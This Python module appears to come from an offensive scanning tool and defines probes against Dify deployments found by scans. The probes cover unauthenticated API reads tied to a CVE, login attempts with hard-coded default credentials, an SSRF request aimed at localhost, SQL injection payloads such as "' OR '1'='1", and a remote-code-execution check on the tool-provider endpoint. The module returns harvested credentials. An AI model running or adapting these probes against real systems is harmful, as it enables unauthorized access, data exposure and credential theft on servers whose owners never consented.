"""Dify prober — system features + setup/weak login + optional SSRF/SQLi."""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential

from ..base import Prober
from ..capability import ProbeSpec, RiskLevel, VulnClass
from ._l2l3 import rce_spec

log = logging.getLogger(__name__)

SPECS = [
    ProbeSpec(
        id="dify.unauth",
        product="dify",
        vuln_class=VulnClass.UNAUTH_READ,
        risk_level=RiskLevel.L0,
        cve_ids=("CVE-2025-63387",),
        entry={
            "paths": [
                "/console/api/system-features",
                "/console/api/setup",
                "/v1/models",
                "/console/api/apps",
            ],
            "tag_prefix": "dify",
        },
        max_requests=5,
    ),
    ProbeSpec(
        id="dify.weak_password",
        product="dify",
        vuln_class=VulnClass.WEAK_PASSWORD,
        risk_level=RiskLevel.L1,
        entry={
            "auth_style": "login_json",
            "login": "/console/api/login",
            "body": {"email": "{user}", "password": "{pass}", "language": "en-US"},
            "token_fields": ["access_token", "token", "refresh_token"],
            "post_auth_paths": [
                "/console/api/workspaces/current",
                "/console/api/apps",
                "/console/api/datasets",
            ],
            "extra_credentials": [
                ("admin@admin.com", "admin"),
                ("admin@example.com", "admin123"),
            ],
        },
        max_requests=14,
    ),
    ProbeSpec(
        id="dify.ssrf.file",
        product="dify",
        vuln_class=VulnClass.SSRF,
        risk_level=RiskLevel.L2,
        entry={
            "path": "/console/api/remote-files/upload",
            "method": "POST",
            "url_param": "url",
            "body": {},
            "target_urls": ["http://127.0.0.1/", "http://localhost/"],
            "use_auth": True,
        },
        max_requests=3,
    ),
    ProbeSpec(
        id="dify.sqli.apps",
        product="dify",
        vuln_class=VulnClass.SQLI,
        risk_level=RiskLevel.L2,
        entry={
            "path": "/console/api/apps",
            "method": "GET",
            "param": "name",
            "baseline": "test",
            "payloads": ["' OR '1'='1", "'"],
            "use_auth": True,
        },
        max_requests=4,
    ),
    # Extra L2 surface + L3 (existing SSRF/SQLi above remain)
    rce_spec(
        "dify",
        path="/console/api/workspaces/current/tool-provider/api/test/pre",
        param="schema",
        use_auth=True,
        suffix="rce_tool_test",
    ),
]


class DifyProber(Prober):
    product_name = "dify"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "dify" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        return await self.run_specs(hit, SPECS)
